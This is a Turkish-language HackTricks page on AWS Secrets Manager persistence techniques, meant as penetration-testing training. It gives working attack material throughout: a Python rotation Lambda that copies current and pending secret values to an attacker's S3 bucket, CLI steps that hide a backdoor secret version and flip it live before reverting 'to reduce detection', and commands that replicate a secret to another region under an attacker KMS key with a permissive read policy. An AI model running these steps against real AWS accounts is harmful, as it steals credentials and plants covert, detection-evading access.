# AWS - Secrets Manager Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Kaynak Politikaları Üzerinden

Kaynak politikaları aracılığıyla **harici hesaplara secret'lere erişim vermek** mümkündür. Daha fazla bilgi için [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) sayfasına bakın. Bir **secret**'e **erişmek** için, harici hesabın ayrıca **secret'i şifreleyen KMS anahtarına erişimi** olması gerektiğini unutmayın.

### Secrets Rotate Lambda Üzerinden

Secret'leri otomatik olarak **rotate** etmek için yapılandırılmış bir **Lambda** çağrılır. Eğer bir saldırgan **kodu değiştirebilirse**, doğrudan kendisine **exfiltrate the new secret** yapabilir.

Böyle bir eylem için lambda kodu şu şekilde görünebilir:
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
{{#include ../../../../banners/hacktricks-training.md}}





### RotateSecret ile rotation Lambda'sını saldırgan kontrollü bir fonksiyona değiştirin

`secretsmanager:RotateSecret`'ı, bir secret'ı saldırgan kontrollü bir rotation Lambda'sına yeniden bağlamak ve hemen bir rotation tetiklemek için kötüye kullanın. Kötü amaçlı fonksiyon rotation adımları (createSecret/setSecret/testSecret/finishSecret) sırasında secret sürümlerini (AWSCURRENT/AWSPENDING) attacker sink'e (ör. S3 veya external HTTP) exfiltrates eder.

- Gereksinimler
- İzinler: `secretsmanager:RotateSecret`, attacker Lambda üzerinde `lambda:InvokeFunction`, Lambda execution rolünü sağlamak için `iam:CreateRole/PassRole/PutRolePolicy` (veya AttachRolePolicy) ile `secretsmanager:GetSecretValue` ve tercihen `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage` (böylece rotation çalışmaya devam eder) izinleri, secret KMS anahtarı için KMS `kms:Decrypt`, ve exfiltration için `s3:PutObject` (veya outbound egress).
- Rotation etkin veya rotasyonu etkinleştirme yeteneğine sahip bir hedef secret id (`SecretId`).

- Etki
- Attacker, meşru rotation kodunu değiştirmeden secret değeri(lerini) elde eder. Sadece rotation yapılandırması attacker Lambda'sını işaret edecek şekilde değiştirilir. Fark edilmezse, planlanmış gelecekteki rotation'lar da attacker'ın fonksiyonunu çağırmaya devam eder.

- Saldırı adımları (CLI)
1) attacker sink ve Lambda rolünü hazırlayın
- Exfiltration için S3 bucket oluşturun ve Lambda tarafından trust edilen, secret'i okuma ve S3'e yazma izinlerine sahip bir execution role oluşturun (gerektiğinde logs/KMS izinleri ekleyin).
2) Her rotation adımında secret value(lerini) alıp S3'e yazan attacker Lambda'yı deploy edin. Minimal rotation mantığı sadece AWSCURRENT'i AWSPENDING'e kopyalayabilir ve servis sağlıklı kalması için finishSecret'te bunu promote edebilir.
3) Rotation'ı yeniden bağlayın ve tetikleyin
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) O secret için S3 prefix'ini listeleyip JSON artefaktlarını inceleyerek exfiltration'ı doğrulayın.
5) (İsteğe bağlı) Tespit riskini azaltmak için orijinal rotation Lambda'sını geri yükleyin.

- Örnek attacker Lambda (Python) S3'e exfiltrating
- Environment: `EXFIL_BUCKET=<bucket>`
- Handler: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Version Stage Hijacking for Covert Persistence (custom stage + fast AWSCURRENT flip)

Abuse Secrets Manager version staging label’larını kullanarak attacker-controlled bir secret versiyonu yerleştirin ve production `AWSCURRENT` kullanmaya devam ederken bunu custom stage altında (örneğin, `ATTACKER`) gizli tutun. İstediğiniz anda `AWSCURRENT`'i attacker’s version'a taşıyarak bağımlı iş yüklerini zehirleyin, ardından tespiti azaltmak için geri döndürün. Bu, secret adını veya rotation config'i değiştirmeden stealthy backdoor persistence ve hızlı time-of-use manipülasyonu sağlar.

- Gereksinimler
- İzinler: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (doğrulama için)
- Hedef secret id, ilgili Bölge içinde.

- Etkisi
- Bir secret'ın gizli, attacker-controlled bir versiyonunu koruyun ve talep üzerine atomik olarak `AWSCURRENT`'i ona çevirerek aynı secret adını çözen herhangi bir tüketiciyi etkileyin. Bu çevirme ve hızlı geri alma, tespit olasılığını azaltırken time-of-use compromise'a olanak tanır.

- Saldırı adımları (CLI)
- Hazırlık
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>CLI komutları</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- Notlar
- `--client-request-token` sağladığınızda, Secrets Manager bunu `VersionId` olarak kullanır. `--version-stages` açıkça ayarlanmadan yeni bir sürüm eklemek, varsayılan olarak `AWSCURRENT`'i yeni sürüme taşır ve önceki sürümü `AWSPREVIOUS` olarak işaretler.


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

Secrets Manager multi-Region replikasyonunu suistimal ederek hedef bir secret'ın daha az izlenen bir Region'a replikasını oluşturun, o Region'da saldırgan kontrollü bir KMS anahtarıyla şifreleyin, sonra replikayı bağımsız bir secret olarak yükseltip saldırgana okuma erişimi veren bir permissive resource policy iliştirin. Birincil Region'daki orijinal secret değişmeden kalır; böylece yükseltilmiş replika üzerinden kalıcı, gizli erişim sağlanır ve ana secret'taki KMS/policy kısıtlamaları atlanmış olur.

- Gereksinimler
- İzinler: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- Replica Region'da: `kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant` (veya `kms:PutKeyPolicy`) — saldırgan principal'ın `kms:Decrypt` yapabilmesi için.
- Yükseltilmiş secret'a okuma erişimi verilecek bir saldırgan principal (user/role).

- Etki
- Saldırgan kontrollü bir KMS CMK ve permissive resource policy altında bağımsız bir replika üzerinden secret değerine kalıcı, cross-Region erişim yolu. Orijinal Region'daki birincil secret dokunulmamış kalır.

- Saldırı (CLI)
- Değişkenler
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) Saldırganın kontrolündeki KMS anahtarını çoğaltma bölgesinde oluşturun
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) attacker KMS key kullanarak secret'i R2'ye çoğalt
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) R2'de replikayı standalone hâline getir
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) R2'deki standalone secret'e permissive resource policy ekle
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) R2'deki attacker principal'dan secret'i oku
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```

